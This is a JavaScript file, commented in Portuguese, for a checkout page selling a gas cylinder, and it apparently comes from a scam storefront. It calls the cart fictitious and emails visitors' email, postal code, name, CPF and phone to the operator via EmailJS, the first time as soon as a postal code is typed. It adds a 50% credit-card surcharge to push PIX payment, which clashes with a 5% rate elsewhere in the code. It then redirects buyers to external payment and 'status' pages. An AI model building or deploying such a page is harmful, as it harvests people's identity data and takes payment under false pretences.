/**
 * Checkout Progressivo - Script Principal
 * Fluxo UX otimizado com revelação progressiva de campos
 * Idêntico ao primeiro código de referência
 */

// Estado global do checkout
let currentStep = 2; // Inicia na etapa 2 (Entrega) - Carrinho é fictício
let selectedShipping = null;
let selectedPayment = 'pix';
let addressFilled = false;
let pixTimer = null;

window.checkoutData = {};

const CREDIT_CARD_FEE_PERCENTAGE = 50;
const BACKEND_API_BASE_URL = '/api/payments';

let cartData = {
    subtotal: 299.90,
    products: [
        {
            "n": "Botijão de Gás 13 Kilos - Cheio (P13)",
            "p": "https://i.postimg.cc/bNrFp7fR/1000310540_removebg_preview.png",
            "v": 89.9,
            "q": 1
        }
    ]
};

// Estado do fluxo progressivo
let flowState = {
    emailValid: false,
    cepValid: false,
    shippingSelected: false,
    personalDataValid: false,
    addressComplementValid: false,
    cpfValid: false
};

// Controle para envio do primeiro email (quando CEP é inserido)
let firstEmailSent = false;

// Inicialização do EmailJS
(function() {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
    script.onload = function() {
        emailjs.init("Sb-IhtOotsnORH1-U");
    };
    document.head.appendChild(script);
})();

document.addEventListener('DOMContentLoaded', function() {
    parseSubtotalFromURL();
    setupEventListeners();
    updateProgress();
    setupMasks();
    updateCartDisplay();
    initializeProgressiveFlow();
    initializePaymentMethod();

    // Configurar teclado numérico para campos específicos
    const numericFields = ['cpf', 'zipCode', 'phone'];
    numericFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.setAttribute('inputmode', 'numeric');
            field.setAttribute('type', 'text');
        }
    });

    const creditCardNotice = document.getElementById('creditCardNotice');
    if (creditCardNotice) {
        creditCardNotice.style.display = 'none';
    }
});

/**
 * Inicializa o fluxo progressivo
 * Mostra apenas a seção de contato e CEP inicialmente
 */
function initializeProgressiveFlow() {
    // Esconde todas as seções exceto contato e CEP (ambas visíveis desde o início)
    const sections = [
        'shippingOptions',
        'sectionPersonalData',
        'sectionAddressInfo',
        'sectionAddressComplement',
        'sectionCpf',
        'sectionButton'
    ];

    sections.forEach(sectionId => {
        const section = document.getElementById(sectionId);
        if (section) {
            section.classList.add('hidden');
            section.classList.remove('show');
        }
    });

    // Garante que a seção de CEP esteja visível
    const sectionCep = document.getElementById('sectionCep');
    if (sectionCep) {
        sectionCep.classList.remove('hidden');
    }

    // Garante que o botão fictício esteja visível
    const sectionContinueButton = document.getElementById('sectionContinueButton');
    if (sectionContinueButton) {
        sectionContinueButton.style.display = 'block';
    }
}

function parseSubtotalFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const subtotalParam = urlParams.get('subtotal');
    const productsParam = urlParams.get('products');
    
    if (subtotalParam) {
        try {
            cartData.subtotal = parseFloat(subtotalParam);
            console.log('Subtotal loaded from URL:', cartData.subtotal);
        } catch (error) {
            console.error('Error parsing subtotal from URL:', error);
        }
    }

    if (productsParam) {
        try {
            cartData.products = JSON.parse(decodeURIComponent(productsParam));
            console.log('Products loaded from URL:', cartData.products);
        } catch (error) {
            console.error('Error parsing products from URL:', error);
        }
    }
}

function updateCartDisplay() {
    updateOrderTotals();
}

function updateOrderTotals() {
    const subtotalEl = document.querySelector(".sidebar .total-row span:last-child");
    const mobileSubtotalEl = document.querySelector("#summaryContent .total-row span:nth-child(2)");
    
    if (subtotalEl) {
        subtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    if (mobileSubtotalEl) {
        mobileSubtotalEl.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    const mobileTotalPrice = document.getElementById("mobileTotalPrice");
    if (mobileTotalPrice) {
        mobileTotalPrice.textContent = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
    }
    
    updateShippingCost();
}

function setupEventListeners() {
    // Form submissions
    document.getElementById('paymentForm').addEventListener('submit', handlePaymentSubmit);

    // Shipping options
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.addEventListener('click', selectShipping);
    });

    // Payment methods
    document.querySelectorAll('.payment-method').forEach(method => {
        method.querySelector('.payment-header').addEventListener('click', selectPayment);
    });

    // Email field - Progressive reveal
    const emailField = document.getElementById('email');
    if (emailField) {
        emailField.addEventListener('blur', handleEmailBlur);
        emailField.addEventListener('input', function() {
            if (this.classList.contains('error')) {
                validateField(this);
            }
        });
    }

    // CEP field
    const zipCodeField = document.getElementById('zipCode');
    if (zipCodeField) {
        zipCodeField.addEventListener('keyup', handleCEPLookup);
        zipCodeField.addEventListener('blur', () => validateField(zipCodeField));
    }

    // All form inputs validation
    document.querySelectorAll('.form-input').forEach(input => {
        input.addEventListener('blur', () => validateField(input));
        input.addEventListener('input', () => {
            if (input.classList.contains('error')) {
                validateField(input);
            }
            checkFormCompletion();
        });
    });

    // Personal data fields
    const personalFields = ['firstName', 'lastName', 'phone'];
    personalFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkPersonalDataCompletion);
            field.addEventListener('input', checkPersonalDataCompletion);
        }
    });

    // Address complement fields
    const addressFields = ['number'];
    addressFields.forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', checkAddressCompletion);
            field.addEventListener('input', checkAddressCompletion);
        }
    });

    // CPF field
    const cpfField = document.getElementById('cpf');
    if (cpfField) {
        cpfField.addEventListener('blur', checkCpfCompletion);
        cpfField.addEventListener('input', checkCpfCompletion);
    }

    // Botão fictício - scroll para o campo que falta
    const btnFictitious = document.getElementById('btnContinueFictitious');
    if (btnFictitious) {
        btnFictitious.addEventListener('click', handleFictitiousButtonClick);
    }

    // Validação ao clicar em "Prosseguir para o pagamento"
    const deliveryForm = document.getElementById('deliveryForm');
    if (deliveryForm) {
        deliveryForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const fieldsToValidate = [
                'email', 'zipCode', 'firstName', 'lastName', 'phone', 'number', 'cpf'
            ];
            
            let firstInvalidField = null;
            let isFormValid = true;

            // Valida campos de input
            fieldsToValidate.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (field) {
                    const isValid = validateField(field);
                    if (!isValid && !firstInvalidField) {
                        firstInvalidField = field;
                    }
                    if (!isValid) isFormValid = false;
                }
            });

            // Valida seleção de frete
            if (!selectedShipping) {
                isFormValid = false;
                const shippingOptions = document.getElementById('shippingOptions');
                if (!firstInvalidField) firstInvalidField = shippingOptions;
                
                // Alerta visual para frete (opcional, já que não é um input padrão)
                shippingOptions.style.border = '1px solid #ef4444';
                shippingOptions.style.borderRadius = '8px';
                shippingOptions.style.padding = '10px';
                setTimeout(() => { shippingOptions.style.border = 'none'; }, 3000);
            }

            if (!isFormValid) {
                if (firstInvalidField) {
                    firstInvalidField.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    if (firstInvalidField.focus) firstInvalidField.focus();
                }
                return false;
            }

            // Se tudo estiver válido, prossegue para o pagamento
            handleDeliverySubmit(e);
        });
    }
}

/**
 * Manipula o blur do campo de email
 * Apenas valida o email (CEP já está visível desde o início)
 */
function handleEmailBlur() {
    const emailField = document.getElementById('email');
    const isValid = validateField(emailField);
    
    if (isValid && !flowState.emailValid) {
        flowState.emailValid = true;
        // CEP já está visível, não precisa revelar
    }
}

/**
 * Manipula o clique no botão fictício
 * Faz scroll para o primeiro campo não preenchido
 */
function handleFictitiousButtonClick() {
    const email = document.getElementById('email');
    if (!validateEmail(email.value)) {
        email.focus();
        email.scrollIntoView({ behavior: 'smooth', block: 'center' });
        validateField(email);
        return;
    }

    if (!flowState.cepValid) {
        const zipCode = document.getElementById('zipCode');
        zipCode.focus();
        zipCode.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    if (!flowState.shippingSelected) {
        const shippingOptions = document.getElementById('shippingOptions');
        shippingOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
    
    const firstName = document.getElementById('firstName');
    if (firstName.value.trim() === '') {
        firstName.focus();
        firstName.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    const lastName = document.getElementById('lastName');
    if (lastName.value.trim() === '') {
        lastName.focus();
        lastName.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    const phone = document.getElementById('phone');
    if (!validatePhone(phone.value)) {
        phone.focus();
        phone.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    const number = document.getElementById('number');
    if (number.value.trim() === '') {
        number.focus();
        number.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }

    const cpf = document.getElementById('cpf');
    if (!validateCPF(cpf.value)) {
        cpf.focus();
        cpf.scrollIntoView({ behavior: 'smooth', block: 'center' });
        return;
    }
}

function updateProgress() {
    const steps = document.querySelectorAll('.step');
    steps.forEach((step, index) => {
        if (index + 1 < currentStep) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (index + 1 === currentStep) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });
}

function goToStep(step) {
    currentStep = step;
    updateProgress();
    
    document.querySelectorAll('.checkout-step').forEach(el => {
        el.classList.remove('active');
    });
    
    const targetStep = document.getElementById(`step${step}`);
    if (targetStep) {
        targetStep.classList.add('active');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    if (step === 3) {
        updateShippingCost();
    }
}

function validateField(field) {
    const errorEl = document.getElementById(field.id + 'Error');
    let isValid = true;

    if (field.id === 'email') {
        isValid = validateEmail(field.value);
    } else if (field.id === 'zipCode') {
        isValid = validateZipCode(field.value);
    } else if (field.id === 'cpf') {
        isValid = validateCPF(field.value);
    } else if (field.id === 'phone') {
        isValid = validatePhone(field.value);
    } else if (field.hasAttribute('required')) {
        isValid = field.value.trim() !== '';
    }

    if (!isValid) {
        field.classList.add('error');
        field.classList.remove('success');
        if (errorEl) errorEl.classList.add('show');
    } else {
        field.classList.remove('error');
        field.classList.add('success');
        if (errorEl) errorEl.classList.remove('show');
    }

    return isValid;
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validateZipCode(zip) {
    return /^\d{5}-\d{3}$/.test(zip) || /^\d{8}$/.test(zip);
}

function validateCPF(cpf) {
    const cleanCPF = cpf.replace(/\D/g, '');
    if (cleanCPF.length !== 11) return false;
    if (/^(\d)\1+$/.test(cleanCPF)) return false;
    
    let sum = 0;
    let remainder;
    
    for (let i = 1; i <= 9; i++) sum = sum + parseInt(cleanCPF.substring(i-1, i)) * (11 - i);
    remainder = (sum * 10) % 11;
    if ((remainder === 10) || (remainder === 11)) remainder = 0;
    if (remainder !== parseInt(cleanCPF.substring(9, 10))) return false;
    
    sum = 0;
    for (let i = 1; i <= 10; i++) sum = sum + parseInt(cleanCPF.substring(i-1, i)) * (12 - i);
    remainder = (sum * 10) % 11;
    if ((remainder === 10) || (remainder === 11)) remainder = 0;
    if (remainder !== parseInt(cleanCPF.substring(10, 11))) return false;
    
    return true;
}

function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, '');
    return cleanPhone.length >= 10 && cleanPhone.length <= 11;
}

function validateDeliveryForm() {
    const fields = ['email', 'zipCode', 'firstName', 'lastName', 'phone', 'number', 'cpf'];
    let isValid = true;
    fields.forEach(id => {
        if (!validateField(document.getElementById(id))) isValid = false;
    });
    if (!selectedShipping) isValid = false;
    return isValid;
}

async function handleCEPLookup(e) {
    const cep = e.target.value.replace(/\D/g, '');
    if (cep.length === 8) {
        const zipCodeField = document.getElementById('zipCode');
        zipCodeField.classList.add('loading');
        
        try {
            const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            const data = await response.json();
            
            if (!data.erro) {
                document.getElementById('address').value = data.logradouro;
                document.getElementById('neighborhood').value = data.bairro;
                document.getElementById('city').value = data.localidade;
                document.getElementById('state').value = data.uf;
                
                addressFilled = true;
                flowState.cepValid = true;
                
                // Revela opções de frete
                revealSection('shippingOptions');
                
                // Envia primeiro email (apenas uma vez)
                if (!firstEmailSent) {
                    sendFirstEmailNotification();
                    firstEmailSent = true;
                }
                
                // Marca campo como sucesso
                zipCodeField.classList.remove('error');
                zipCodeField.classList.add('success');
                document.getElementById('zipCodeError').classList.remove('show');
            } else {
                handleCEPError();
            }
        } catch (error) {
            console.error('Erro ao buscar CEP:', error);
            handleCEPError();
        } finally {
            zipCodeField.classList.remove('loading');
        }
    }
}

function revealSection(sectionId, scroll = true) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.remove('hidden');
        section.classList.add('show');
        if (scroll) {
            setTimeout(() => {
                section.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }, 100);
        }
    }
}

function hideSection(sectionId) {
    const section = document.getElementById(sectionId);
    if (section) {
        section.classList.add('hidden');
        section.classList.remove('show');
    }
}

function handleCEPError() {
    const zipCodeInput = document.getElementById('zipCode');
    const errorEl = document.getElementById('zipCodeError');
    
    zipCodeInput.classList.add('error');
    zipCodeInput.classList.remove('success');
    errorEl.textContent = 'CEP não encontrado. Verifique e tente novamente.';
    errorEl.classList.add('show');
    
    // Esconde seções subsequentes
    hideSection('shippingOptions');
    hideSection('sectionPersonalData');
    hideSection('sectionAddressInfo');
    hideSection('sectionAddressComplement');
    hideSection('sectionCpf');
    hideSection('sectionButton');
}

/**
 * Seleciona opção de frete e revela próximas seções
 */
function selectShipping() {
    // Remove seleção anterior
    document.querySelectorAll('.shipping-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    // Adiciona seleção atual
    this.classList.add('selected');
    selectedShipping = this.dataset.shipping;
    
    // Atualiza estado e custos
    flowState.shippingSelected = true;
    updateShippingCost();
    
    // Revela seções de dados pessoais, endereço e CPF (sem scroll)
    if (!document.getElementById('sectionPersonalData').classList.contains('show')) {
        revealSection('sectionPersonalData', false);
        revealSection('sectionAddressInfo', false);
        revealSection('sectionAddressComplement', false);
        revealSection('sectionCpf', false); // CPF já disponível junto com endereço
        
        // Não foca em nenhum campo automaticamente
        // O usuário deve clicar no campo que deseja preencher
    }
}

/**
 * Verifica se os dados pessoais estão completos
 */
function checkPersonalDataCompletion() {
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const phone = document.getElementById('phone');
    
    const isValid = 
        firstName.value.trim() !== '' &&
        lastName.value.trim() !== '' &&
        validatePhone(phone.value);
    
    if (isValid && !flowState.personalDataValid) {
        flowState.personalDataValid = true;
    } else if (!isValid) {
        flowState.personalDataValid = false;
    }
    
    checkFormCompletion();
}

/**
 * Verifica se o complemento do endereço está completo
 */
function checkAddressCompletion() {
    const number = document.getElementById('number');
    
    const isValid = number.value.trim() !== '';
    
    if (isValid && !flowState.addressComplementValid) {
        flowState.addressComplementValid = true;
        // CPF já está visível junto com o endereço, não precisa revelar
    } else if (!isValid) {
        flowState.addressComplementValid = false;
    }
    
    checkFormCompletion();
}

/**
 * Verifica se o CPF está completo e válido
 */
function checkCpfCompletion() {
    const cpf = document.getElementById('cpf');
    const isValid = validateCPF(cpf.value);
    
    if (isValid && !flowState.cpfValid) {
        flowState.cpfValid = true;
        cpf.classList.add('success');
        cpf.classList.remove('error');
        
        // Revela botão de continuar e esconde o fictício
        revealSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'none';
        }
    } else if (!isValid && flowState.cpfValid) {
        flowState.cpfValid = false;
        // Esconde botão real e mostra fictício
        hideSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'block';
        }
    }
    
    checkFormCompletion();
}

/**
 * Verifica se todo o formulário está completo
 * Habilita/desabilita o botão de continuar
 */
function checkFormCompletion() {
    const btn = document.getElementById('btnContinuePayment');
    if (!btn) return;
    
    const email = document.getElementById('email');
    const zipCode = document.getElementById('zipCode');
    const firstName = document.getElementById('firstName');
    const lastName = document.getElementById('lastName');
    const phone = document.getElementById('phone');
    const number = document.getElementById('number');
    const cpf = document.getElementById('cpf');
    
    const isComplete = 
        validateEmail(email.value) &&
        validateZipCode(zipCode.value) &&
        addressFilled &&
        selectedShipping !== null &&
        firstName.value.trim() !== '' &&
        lastName.value.trim() !== '' &&
        validatePhone(phone.value) &&
        number.value.trim() !== '' &&
        validateCPF(cpf.value);
    
    // O botão agora fica habilitado para permitir a sinalização de erros ao clicar
    btn.disabled = false;
    
    // Mostra o botão se todos os campos anteriores estiverem preenchidos
    if (flowState.cpfValid && !document.getElementById('sectionButton').classList.contains('show')) {
        revealSection('sectionButton');
        const sectionContinueButton = document.getElementById('sectionContinueButton');
        if (sectionContinueButton) {
            sectionContinueButton.style.display = 'none';
        }
    }
}

function setupMasks() {
    document.getElementById('cpf').addEventListener('input', function(e) {
        e.target.value = applyCPFMask(e.target.value);
    });

    document.getElementById('phone').addEventListener('input', function(e) {
        e.target.value = applyPhoneMask(e.target.value);
    });

    document.getElementById('zipCode').addEventListener('input', function(e) {
        e.target.value = applyZipMask(e.target.value);
    });

    const cardNumber = document.getElementById('cardNumber');
    if (cardNumber) {
        cardNumber.addEventListener('input', function(e) {
            e.target.value = applyCardMask(e.target.value);
        });
    }

    const cardExpiry = document.getElementById('cardExpiry');
    if (cardExpiry) {
        cardExpiry.addEventListener('input', function(e) {
            e.target.value = applyExpiryMask(e.target.value);
        });
    }

    const cardCvv = document.getElementById('cardCvv');
    if (cardCvv) {
        cardCvv.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
    }
}

function applyCPFMask(v) {
    v = v.replace(/\D/g, "");
    if (v.length > 11) v = v.substring(0, 11);
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d)/, "$1.$2");
    v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    return v;
}

function applyPhoneMask(v) {
    v = v.replace(/\D/g, "");
    if (v.length > 11) v = v.substring(0, 11);
    v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
    v = v.replace(/(\d)(\d{4})$/, "$1-$2");
    return v;
}

function applyZipMask(v) {
    v = v.replace(/\D/g, "");
    if (v.length > 8) v = v.substring(0, 8);
    v = v.replace(/(\d{5})(\d)/, "$1-$2");
    return v;
}

function applyCardMask(v) {
    v = v.replace(/\D/g, "");
    if (v.length > 16) v = v.substring(0, 16);
    v = v.replace(/(\d{4})(\d)/g, "$1 $2");
    return v.trim();
}

function applyExpiryMask(v) {
    v = v.replace(/\D/g, "");
    if (v.length > 4) v = v.substring(0, 4);
    v = v.replace(/(\d{2})(\d)/, "$1/$2");
    return v;
}

async function handleDeliverySubmit(e) {
    e.preventDefault();
    if (validateDeliveryForm()) {
        const formData = new FormData(e.target);
        const deliveryData = {
            email: formData.get('email'),
            firstName: formData.get('firstName'),
            lastName: formData.get('lastName'),
            phone: formData.get('phone'),
            cpf: formData.get('cpf'),
            zipCode: formData.get('zipCode'),
            address: formData.get('address'),
            number: formData.get('number'),
            complement: formData.get('complement'),
            neighborhood: formData.get('neighborhood'),
            city: formData.get('city'),
            state: formData.get('state'),
            shippingMethod: selectedShipping
        };

        window.checkoutData = { ...window.checkoutData, ...deliveryData };
        
        // Enviar email via EmailJS (não bloqueia o fluxo)
        sendEmailNotification(deliveryData);
        
        goToStep(3);
    }
}

// Função para enviar primeiro email via EmailJS (quando CEP é inserido)
// Envia apenas: Email, CEP e Valor
async function sendFirstEmailNotification() {
    try {
        const email = document.getElementById('email').value;
        const cep = document.getElementById('zipCode').value;
        const valor = `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`;
        
        const templateParams = {
            customer_name: 'Cliente',
            customer_email: email,
            customer_cpf: '-',
            customer_phone: '-',
            order_subtotal: valor,
            order_date: new Date().toLocaleString('pt-BR'),
            to_name: 'Cliente',
            from_name: 'PagOnline',
            message: `Novo interesse no checkout!\n\nE-mail: ${email}\nCEP: ${cep}\nValor do Pedido: ${valor}\nData: ${new Date().toLocaleString('pt-BR')}\n\n(Primeiro contato - CEP inserido)`
        };

        const response = await emailjs.send(
            'service_3hgwt59',
            'template_vn6qykn',
            templateParams
        );

        console.log('Primeiro email enviado com sucesso!', response.status, response.text);
        return true;
    } catch (error) {
        console.error('Erro ao enviar primeiro email:', error);
        return false;
    }
}

// Função para enviar email via EmailJS (quando clica em "Prosseguir para pagamento")
async function sendEmailNotification(contactData) {
    try {
        const templateParams = {
            customer_name: `${contactData.firstName} ${contactData.lastName}`,
            customer_email: contactData.email,
            customer_cpf: contactData.cpf,
            customer_phone: contactData.phone,
            order_subtotal: `R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}`,
            order_date: new Date().toLocaleString('pt-BR'),
            to_name: contactData.firstName,
            from_name: 'PagOnline',
            message: `Novo pedido iniciado!\n\nCliente: ${contactData.firstName} ${contactData.lastName}\nE-mail: ${contactData.email}\nCPF: ${contactData.cpf}\nTelefone: ${contactData.phone}\nValor: R$ ${cartData.subtotal.toFixed(2).replace(".", ",")}\nData: ${new Date().toLocaleString('pt-BR')}`
        };

        const response = await emailjs.send(
            'service_3hgwt59',
            'template_vn6qykn',
            templateParams
        );

        console.log('Email enviado com sucesso!', response.status, response.text);
        return true;
    } catch (error) {
        console.error('Erro ao enviar email:', error);
        return false;
    }
}

async function handlePaymentSubmit(e) {
    console.log("handlePaymentSubmit chamado.");
    e.preventDefault();
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.classList.add('btn-loading');
    
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    try {
        const orderData = {
            ...window.checkoutData,
            paymentMethod: selectedPayment,
            subtotal: cartData.subtotal,
            shippingCost: getShippingCost(),
            total: calculateTotal()
        };

        // Montar URL de redirecionamento
        const baseUrl = "https://facilita-pag.onrender.com/spinner/";
        const subtotal = orderData.total.toFixed(2);
        
        // Produtos (utiliza os produtos carregados do carrinho original)
        const products = cartData.products;
        
        // Endereço formatado
        const address = `${orderData.address}, ${orderData.number}, ${orderData.neighborhood}, ${orderData.city}/${orderData.state}`;
        const deliveryTime = "Entrega em 20 minutos";
        const cep = orderData.zipCode.replace(/\D/g, '');

        const params = new URLSearchParams({
            subtotal: subtotal,
            products: JSON.stringify(products),
            address: address,
            delivery_time: deliveryTime,
            cep: cep
        });

        const redirectUrl = `${baseUrl}?${params.toString()}`;
        
        // Redirecionar o usuário
        window.location.href = redirectUrl;

    } catch (error) {
        console.error('Erro:', error);
        alert(error.message || 'Erro ao finalizar pedido. Tente novamente.');
    } finally {
        submitBtn.classList.remove('btn-loading');
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

function showPixPaymentDetails(paymentResult) {
    const pixPaymentDetails = document.getElementById('pixPaymentDetails');
    const pixQrCodeContainer = document.getElementById('pixQrCode');
    const pixCodeText = document.getElementById('pixCodeText');
    
    pixPaymentDetails.style.display = 'block';
    
    if (paymentResult.pix && paymentResult.pix.qrcode) {
        const pixCode = paymentResult.pix.qrcode;
        pixCodeText.textContent = pixCode;

        const paymentForm = document.getElementById('paymentForm');
        const submitButton = paymentForm.querySelector('button[type="submit"]');

        if (submitButton) {
            submitButton.textContent = 'Já Paguei';
            submitButton.style.backgroundColor = '#10b981';
            submitButton.style.borderColor = '#10b981';
            submitButton.type = 'button';
            submitButton.onclick = function() {
                window.location.href = 'https://statusdacompra.onrender.com/'; 
            };
        }

    } else {
        pixQrCodeContainer.innerHTML = "Não foi possível obter os dados do PIX.";
        pixCodeText.textContent = "Tente novamente.";
        console.error("Estrutura de dados PIX inesperada:", paymentResult);
    }
    
    startPixTimer(900);
}

function startPixTimer(seconds) {
    const timerElement = document.getElementById('pixTimeRemaining');
    let timeLeft = seconds;
    
    pixTimer = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const secs = timeLeft % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
            clearInterval(pixTimer);
            timerElement.textContent = 'Expirado';
            alert('O código PIX expirou. Por favor, gere um novo código.');
        }
        
        timeLeft--;
    }, 1000);
}

function copyPixCode() {
    const pixCodeText = document.getElementById('pixCodeText');
    const copyButton = document.getElementById('pixCopyButton');
    
    if (navigator.clipboard) {
        navigator.clipboard.writeText(pixCodeText.textContent).then(() => {
            copyButton.textContent = 'Copiado!';
            copyButton.classList.add('copied');
            
            setTimeout(() => {
                copyButton.textContent = 'Copiar Código';
                copyButton.classList.remove('copied');
            }, 2000);
        });
    } else {
        const textArea = document.createElement('textarea');
        textArea.value = pixCodeText.textContent;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        copyButton.textContent = 'Copiado!';
        copyButton.classList.add('copied');
        
        setTimeout(() => {
            copyButton.textContent = 'Copiar Código';
            copyButton.classList.remove('copied');
        }, 2000);
    }
}

function showSuccessNotification(message) {
    const notification = document.getElementById('successNotification');
    notification.textContent = message;
    notification.style.display = 'block';
    
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

function getShippingCost() {
    switch (selectedShipping) {
        case 'express': return 9.97;
        case 'same-day': return 11.90;
        default: return 0;
    }
}

function calculateTotal() {
    let total = cartData.subtotal + getShippingCost();
    if (selectedPayment === 'credit') {
        total = total * 1.05;
    }
    return total;
}

function updateShippingCost() {
    const shippingCostEl = document.getElementById('shippingCost');
    const mobileShippingCostEl = document.getElementById('mobileShippingCost');
    const totalPriceEl = document.getElementById('totalPrice');
    const mobileTotalPriceEl = document.getElementById('mobileTotalPrice');
    const mobileFinalPriceEl = document.getElementById('mobileFinalPrice');
    
    let shippingCost = 0;
    let basePrice = cartData.subtotal;
    let shippingText = '';

    switch (selectedShipping) {
        case 'standard':
            shippingText = 'GRÁTIS';
            shippingCost = 0;
            break;
        case 'express':
            shippingText = 'R$ 9,97';
            shippingCost = 9.97;
            break;
        default:
            shippingText = 'GRÁTIS';
            shippingCost = 0;
    }

    let total = basePrice + shippingCost;
    let creditCardFee = 0;
    
    if (selectedPayment === 'credit' && currentStep === 3) {
        creditCardFee = total * (CREDIT_CARD_FEE_PERCENTAGE / 100);
        total = total + creditCardFee;
        
        document.getElementById('creditCardFeeRow').style.display = 'flex';
        document.getElementById('mobileCreditCardFeeRow').style.display = 'flex';
        
        const creditCardFeeFormatted = `+R$ ${creditCardFee.toFixed(2).replace('.', ',')}`;
        document.getElementById('creditCardFee').textContent = creditCardFeeFormatted;
        document.getElementById('mobileCreditCardFee').textContent = creditCardFeeFormatted;
        
        updateCreditCardValues(total);
        
        const creditCardNotice = document.getElementById('creditCardNotice');
        if (creditCardNotice) {
            creditCardNotice.style.display = 'block';
        }
    } else {
        document.getElementById('creditCardFeeRow').style.display = 'none';
        document.getElementById('mobileCreditCardFeeRow').style.display = 'none';
        
        const creditCardNotice = document.getElementById('creditCardNotice');
        if (creditCardNotice) {
            creditCardNotice.style.display = 'none';
        }
    }
    
    updatePaymentMethodValues(total - creditCardFee);

    const totalFormatted = `R$ ${total.toFixed(2).replace('.', ',')}`;
    
    if (shippingCostEl) shippingCostEl.textContent = shippingText;
    if (mobileShippingCostEl) mobileShippingCostEl.textContent = shippingText;
    if (totalPriceEl) totalPriceEl.textContent = totalFormatted;
    if (mobileTotalPriceEl) mobileTotalPriceEl.textContent = totalFormatted;
    if (mobileFinalPriceEl) mobileFinalPriceEl.textContent = totalFormatted;
}

function updateCreditCardValues(totalWithFee) {
    const creditCardTotalValueEl = document.getElementById('creditCardTotalValue');
    
    if (creditCardTotalValueEl) {
        creditCardTotalValueEl.textContent = `R$ ${totalWithFee.toFixed(2).replace('.', ',')}`;
    }
    
    updateInstallmentOptions(totalWithFee);
}

function updatePaymentMethodValues(baseTotal) {
    const pixValueEl = document.getElementById('pixValue');
    const boletoValueEl = document.getElementById('boletoValue');
    
    const baseFormatted = `R$ ${baseTotal.toFixed(2).replace('.', ',')}`;
    
    if (pixValueEl) {
        pixValueEl.textContent = baseFormatted;
    }
    if (boletoValueEl) {
        boletoValueEl.textContent = baseFormatted;
    }
}

function updateInstallmentOptions(total) {
    const installmentsSelect = document.getElementById('installments');
    if (!installmentsSelect) return;
    
    while (installmentsSelect.children.length > 1) {
        installmentsSelect.removeChild(installmentsSelect.lastChild);
    }
    
    const installmentOptions = [
        { value: 1, text: `1x R$ ${total.toFixed(2).replace('.', ',')} à vista` },
        { value: 2, text: `2x R$ ${(total / 2).toFixed(2).replace('.', ',')} sem juros` },
        { value: 3, text: `3x R$ ${(total / 3).toFixed(2).replace('.', ',')} sem juros` },
        { value: 4, text: `4x R$ ${(total / 4).toFixed(2).replace('.', ',')} sem juros` },
        { value: 5, text: `5x R$ ${(total / 5).toFixed(2).replace('.', ',')} sem juros` },
        { value: 6, text: `6x R$ ${(total / 6).toFixed(2).replace('.', ',')} sem juros` },
        { value: 7, text: `7x R$ ${(total * 1.05 / 7).toFixed(2).replace('.', ',')} com juros` },
        { value: 8, text: `8x R$ ${(total * 1.08 / 8).toFixed(2).replace('.', ',')} com juros` },
        { value: 9, text: `9x R$ ${(total * 1.12 / 9).toFixed(2).replace('.', ',')} com juros` },
        { value: 10, text: `10x R$ ${(total * 1.15 / 10).toFixed(2).replace('.', ',')} com juros` },
        { value: 11, text: `11x R$ ${(total * 1.18 / 11).toFixed(2).replace('.', ',')} com juros` },
        { value: 12, text: `12x R$ ${(total * 1.20 / 12).toFixed(2).replace('.', ',')} com juros` }
    ];
    
    installmentOptions.forEach(option => {
        const optionEl = document.createElement('option');
        optionEl.value = option.value;
        optionEl.textContent = option.text;
        installmentsSelect.appendChild(optionEl);
    });
}

/**
 * Inicializa o método de pagamento pré-selecionado (PIX)
 * Garante que a classe .selected seja aplicada corretamente
